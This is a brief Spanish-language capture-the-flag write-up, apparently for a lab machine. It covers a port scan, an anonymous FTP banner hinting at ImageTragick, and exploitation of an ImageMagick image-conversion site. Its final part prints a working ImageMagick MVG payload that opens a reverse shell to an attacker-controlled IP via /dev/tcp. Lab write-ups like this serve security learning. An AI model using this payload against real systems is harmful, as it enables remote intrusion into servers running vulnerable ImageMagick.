
# SCAN

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http       nginx 1.14.0 (Ubuntu)

```
# FTP
Podemos logearnos en ftp con anonymous y nos muestra un mensaje:
```
30-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```


En el puerto 8081 hay un servidor web que sirve una pagina web cuyo objetivo es transformar imagenes con extension .png en .jpg y lo realiza
a traves de una aplicacion que se llama imagemagick que presenta una vulnerabilidad del tipo RCE (Remote Command Execution)

![image](https://user-images.githubusercontent.com/70599089/183709438-49160fa4-c516-4d96-9fb0-c938344cb94e.png)


que se puede explotar con metasploit

No me funciona metasploit

# SIN METASPLOIT

En la pagina PayLoadAllThings se encuentra el siguient payload para imagemagik:
```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/IP/9999 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
con este payload conseguimos un reverse shell para el usuario magician

